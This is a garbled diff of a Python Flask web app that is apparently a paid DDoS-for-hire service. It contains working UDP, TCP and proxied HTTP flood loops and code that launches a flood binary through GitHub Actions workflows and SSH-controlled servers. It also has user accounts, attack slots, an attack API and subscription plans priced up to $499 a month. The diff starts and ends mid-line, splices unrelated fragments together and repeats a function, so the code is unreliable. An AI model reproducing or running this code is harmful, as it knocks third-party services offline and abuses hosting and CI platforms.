@@ -509,6 +509,245 @@ def api_attack():
     if key_obj.expires_at and datetime.utcnow() > key_obj.expires_at:
         return jsonify({'error': 'API key expired'}), 403
     if key_obj.whitelist_ips:
+    allowed_ips = [ip.strip() for ip in key_ob - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: ./soul {target} {port} {duration} {binary_method}
+"""
+        try:
+            contents = repo.get_contents(".github/workflows/main.yml")
+            repo.update_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content, contents.sha)
+        except:
+            repo.create_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content)
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+def trigger_vps_node(node, target, port, duration, method):
+    binary_method = "udp" if method == "UDP" else "tcp" if method == "TCP" else "udp"
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        if node.vps_password:
+            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                        password=node.vps_password, timeout=10)
+        else:
+            ssh.connect(node.vps_host, port=node.vps_port, username=node.vps_username,
+                        key_filename=node.vps_key_path, timeout=10)
+        cmd = f"cd /root && ./soul {target} {port} {duration} {binary_method} > /dev/null 2>&1 &"
+        ssh.exec_command(cmd)
+        ssh.close()
+        return True
+    except Exception as e:
+        print(e)
+        return False
+
+def run_local_python(target, port, duration, method):
+    end_time = time.time() + duration
+    packets = 0
+    if method == "UDP":
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        payload = random.randbytes(1024)
+        while time.time() < end_time:
+            sock.sendto(payload, (target, port))
+            packets += 1
+        sock.close()
+    elif method == "TCP":
+        while time.time() < end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.5)
+                sock.connect_ex((target, port))
+                sock.close()
+                packets += 1
+            except:
+                pass
+    else:
+        url = f"http://{target}:{port}"
+        headers = {"User-Agent": "Mozilla/5.0"}
+        while time.time() < end_time:
+            proxy = get_random_proxy()
+            proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
+            try:
+                requests.get(url, headers=headers, proxies=proxies, timeout=3)
+                packets += 1
+            except:
+                pass
+    return packets
+
+def run_attack_on_nodes(user_id, target, port, duration, method, source='web'):
+    nodes = AttackNode.query.filter_by(enabled=True).all()
+    if not nodes:
+        packets = run_local_python(target, port, duration, method)
+        with app.app_context():
+            log = AttackLog(user_id=user_id, target=target, port=port, duration=duration,
+                            method=method, concurrent=1, status='completed')
+            db.session.add(log)
+            db.session.commit()
+            if user_id:
+                user = User.query.get(user_id)
+                if user:
+                    user.total_attacks += 1
+                    user.slots_used = max(0, user.slots_used - 1)
+                    db.session.commit()
+        return
+
+    with app.app_context():
+        log = AttackLog(user_id=user_id, target=target, port=port, duration=duration,
+                        method=method, concurrent=len(nodes))
+        db.session.add(log)
+        db.session.commit()
+        if user_id:
+            user = User.query.get(user_id)
+            if user:
+                user.total_attacks += 1
+                db.session.commit()
+
+    threads = []
+    def worker(node):
+        if node.node_type == 'github':
+            trigger_github_node(node, target, port, duration, method)
+        else:
+            trigger_vps_node(node, target, port, duration, method)
+    for node in nodes:
+        t = threading.Thread(target=worker, args=(node,))
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+
+    with app.app_context():
+        log.status = 'completed'
+        db.session.commit()
+
+# ---------- User Routes ----------
+@app.route('/')
+def index():
+    if 'user_token' in session:
+        return redirect(url_for('dashboard'))
+    return redirect(url_for('login'))
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        token = request.form.get('token')
+        captcha_answer = request.form.get('captcha')
+        expected_answer = session.get('captcha_answer')
+        if not captcha_answer or not expected_answer or str(captcha_answer) != str(expected_answer):
+            flash('Invalid captcha. Please try again.', 'danger')
+            q, a = generate_captcha()
+            session['captcha_question'] = q
+            session['captcha_answer'] = a
+            return render_template_string(LOGIN_HTML, captcha_question=q)
+        user = get_user_by_token(token)
+        if user:
+            session['user_token'] = token
+            session['user_id'] = user.id
+            flash('Logged in successfully', 'success')
+            return redirect(url_for('dashboard'))
+        flash('Invalid token', 'danger')
+    q, a = generate_captcha()
+    session['captcha_question'] = q
+    session['captcha_answer'] = a
+    return render_template_string(LOGIN_HTML, captcha_question=q)
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        captcha_answer = request.form.get('captcha')
+        expected_answer = session.get('captcha_answer')
+        if not captcha_answer or not expected_answer or str(captcha_answer) != str(expected_answer):
+            flash('Invalid captcha. Please try again.', 'danger')
+            q, a = generate_captcha()
+            session['captcha_question'] = q
+            session['captcha_answer'] = a
+            return render_template_string(REGISTER_HTML, captcha_question=q)
+        token = generate_token()
+        user = User(token=token, plan="Free Plan", max_concurrent=1, max_duration=60)
+        db.session.add(user)
+        db.session.commit()
+        flash(f'Your access token: {token}', 'success')
+        return redirect(url_for('login'))
+    q, a = generate_captcha()
+    session['captcha_question'] = q
+    session['captcha_answer'] = a
+    return render_template_string(REGISTER_HTML, captcha_question=q)
+
+@app.route('/dashboard')
+def dashboard():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    user = User.query.get(session['user_id'])
+    if not user:
+        session.clear()
+        return redirect(url_for('login'))
+    attacks = AttackLog.query.filter_by(user_id=user.id).order_by(AttackLog.timestamp.desc()).limit(10).all()
+    slots_used = user.slots_used
+    max_slots = user.max_concurrent
+    return render_template_string(DASHBOARD_HTML, user=user, attacks=attacks,
+                                  slots_used=slots_used, max_slots=max_slots)
+
+@app.route('/attack', methods=['GET', 'POST'])
+def attack_page():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    user = User.query.get(session['user_id'])
+    if request.method == 'POST':
+        target = request.form.get('target')
+        port = int(request.form.get('port'))
+        duration = int(request.form.get('duration'))
+        method = request.form.get('method')
+        concurrent = int(request.form.get('concurrent', 1))
+        if duration > user.max_duration:
+            flash(f'Duration exceeds limit ({user.max_duration}s)', 'danger')
+            return redirect(url_for('attack_page'))
+        if concurrent > user.max_concurrent:
+            flash(f'Concurrent exceeds limit ({user.max_concurrent})', 'danger')
+            return redirect(url_for('attack_page'))
+        if user.slots_used + concurrent > user.max_concurrent:
+            flash('No free slots', 'danger')
+            return redirect(url_for('attack_page'))
+        user.slots_used += concurrent
+        db.session.commit()
+        thread = threading.Thread(target=run_attack_on_nodes, args=(user.id, target, port, duration, method, 'web'))
+        thread.daemon = True
+        thread.start()
+        flash(f'Attack launched on {target}:{port} ({method})', 'success')
+        return redirect(url_for('attack_page'))
+    return render_template_string(ATTACK_HTML, user=user)
+
+@app.route('/products')
+def products_page():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    user = User.query.get(session['user_id'])
+    plans = [
+        {'name': 'Free Plan', 'price': 'Free', 'concurrent': 1, 'duration': 60, 'methods': 'UDP Only', 'slots': 1},
+        {'name': 'Pro Plan', 'price': '$49/month', 'concurrent': 5, 'duration': 300, 'methods': 'UDP, TCP', 'slots': 5},
+        {'name': 'Enterprise Plan', 'price': '$199/month', 'concurrent': 25, 'duration': 1200, 'methods': 'All Methods', 'slots': 25},
+        {'name': 'Ultimate Plan', 'price': '$499/month', 'concurrent': 100, 'duration': 3600, 'methods': 'All Methods + API', 'slots': 100}
+    ]
+    return render_template_string(PRODUCTS_HTML, user=user, plans=plans)
+
+@app.route('/api/attack', methods=['POST'])
+def api_attack():
+    data = request.get_json()
+    if not data:
+        return jsonify({'error': 'Invalid JSON'}), 400
+    api_key = data.get('api_key')
+    target = data.get('target')
+    port = data.get('port')
+    duration = data.get('duration')
+    method = data.get('method', 'UDP')
+    concurrent = data.get('concurrent', 1)
+    if not api_key or not target or not port or not duration:
+        return jsonify({'error': 'Missing parameters'}), 400
+    key_obj = ApiKey.query.filter_by(key=api_key).first()
+    if not key_obj:
+        return jsonify({'error': 'Invalid API key'}), 401
+    if key_obj.expires_at and datetime.utcnow() > key_obj.expires_at:
+        return jsonify({'error': 'API key expired'}), 403
+    if key_obj.whitelist_ips:
         allowed_ips = [ip.strip() for ip in ke            lines = resp.text.splitlines()
             proxies = [p.strip() for p in lines if ":" in p and p.strip()]
             if proxies:
